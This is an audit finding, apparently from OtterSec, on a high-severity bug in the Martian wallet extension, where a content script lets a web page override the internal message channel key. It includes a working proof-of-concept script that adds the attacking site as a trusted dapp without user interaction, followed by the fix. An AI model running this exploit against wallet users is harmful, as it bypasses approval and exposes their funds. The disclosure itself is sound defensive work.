---
tags:
  - platform/ottersec
  - has/poc
  - severity/high
  - sector/wallet
protocol: "[[Martian]]"
auditors:
  - "[[Maxwell Garrett]]"
report: "https://martianwallet.xyz/"
genome:
  - "[[wrong-condition]]"
  - "[[role-bypass]]"
  - "[[commitment-uniqueness]]"
---
# Overriding channel key through destruction

- id: 48557
- impact: HIGH
- protocol: [[Martian]]
- reporter: Maxwell Garrett (OtterSec)
- source: https://martianwallet.xyz/

## Summary


The report discusses a bug in the martian-wallet-extension, where the injected_script_message event listener in the contentScript.js file sends a postMessage to runtime by destructuring the properties of the details object. This allows attacker sites to override the channel key and access internal onmessage channels, allowing them to send arbitrary messages. A proof of concept demonstrates how a malicious site can exploit this vulnerability by adding itself as a trusted dapp and skipping UI interaction. The suggested solution is to unpack the details object in an inner object instead of at the same layer as the channel key. This issue has been patched in a recent commit.

## Details

## Martian Injected Script Vulnerability

The `martian_injected_script_message` event listener in `contentScript.js` sends the `postMessage` to runtime by taking the properties of the details object through destructuring.

## Source Code

**File:** `src/chrome/contentScript.js` (JavaScript)

```javascript
window.addEventListener('martian_injected_script_message', function (event) {
  // console.log("content script window listen message", event);
  if (event.detail.method) {
    // contentscript -> background
    const fetchedData = fetchTitleIcon(document);
    const metainfo = {
      iconUrl: fetchedData.iconUrl,
      docTitle: fetchedData.docTitle
    };
    event.detail.metainfo = metainfo;
    const details = { ...event.detail, metainfo: metainfo };
    chrome.runtime.sendMessage(
      {
        channel: 'martian_contentscript_background_channel',
        ...details
      },
    );
  }
});
```

As the unpacking of details is happening beside the channel key, an attacker site can override the channel key and access the internal `onmessage` channels. This allows attacker sites to send arbitrary messages to internal channels.

## Proof of Concept

The following PoC demonstrates how a malicious site can add itself as a trusted dapp and skip UI interaction by using the `aebc` channel.

**File:** `h4ck.html` (HTML)

```html
<script>
// SIMPLE POC TO ACCESS internal aebc channel
window.dispatchEvent(new CustomEvent("martian_injected_script_message", {
  detail: {
    method: 'hacked',
    data: {},
    id: 6,
    channel: 'aebc',
    origin: window.origin,
    tabId: 102032735,
    status: 200,
    iconUrl: 'https://pew.com/bad.img'
  }
}));
</script>
```

## Remediation

Unpack the details object in an inner object instead of at the same layer as the channel key.

**File:** `martian-wallet-extension/src/chrome/contentScript.js` (JavaScript)

```javascript
const details = { ...event.detail, metainfo: metainfo };
chrome.runtime.sendMessage(
  {
    channel: 'martian_contentscript_background_channel',
    details: {
      ...details
    },
  },
);
```

## Patch

Patched in commit `8c826ac6`.

© 2022 OtterSec LLC. All Rights Reserved.
